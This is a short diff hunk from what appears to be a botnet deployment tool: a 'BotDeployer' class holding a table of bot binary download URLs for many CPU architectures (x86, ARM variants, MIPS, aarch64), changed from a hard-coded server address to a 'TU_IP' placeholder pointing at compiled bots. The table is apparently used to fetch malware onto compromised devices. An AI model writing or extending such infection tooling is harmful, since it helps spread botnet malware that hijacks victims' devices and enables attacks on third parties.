@@ -1061,16 +1061,16 @@ class SmartScoringSystem:
 
 class BotDeployer:
     BOT_URLS = {
-        "default": "http://217.154.212.66:11202/bins/x86",
-        "x86_64": "http://217.154.212.66:11202/bins/x86_64",
-        "x86": "http://217.154.212.66:11202/bins/x86",
-        "arm": "http://217.154.212.66:11202/bins/arm",
-        "arm5": "http://217.154.212.66:11202/bins/arm5",
-        "arm6": "http://217.154.212.66:11202/bins/arm6",
-        "arm7": "http://217.154.212.66:11202/bins/arm7",
-        "mips": "http://217.154.212.66:11202/bins/mips",
-        "mipsel": "http://217.154.212.66:11202/bins/mipsel",
-        "aarch64": "http://217.154.212.66:11202/bins/aarch64"
+    "default": "http://TU_IP:11202/bot/compiled_bots/x86",
+    "x86_64": "http://TU_IP:11202/bot/compiled_bots/x86_64",
+    "x86": "http://TU_IP:11202/bot/compiled_bots/x86",
+    "arm": "http://TU_IP:11202/bot/compiled_bots/arm",
+    "arm5": "http://TU_IP:11202/bot/compiled_bots/arm5",
+    "arm6": "http://TU_IP:11202/bot/compiled_bots/arm6",
+    "arm7": "http://TU_IP:11202/bot/compiled_bots/arm7",
+    "mips": "http://TU_IP:11202/bot/compiled_bots/mips",
+    "mipsel": "http://TU_IP:11202/bot/compiled_bots/mipsel",
+    "aarch64": "http://TU_IP:11202/bot/compiled_bots/aarch64"
     }
     
     @staticmethod
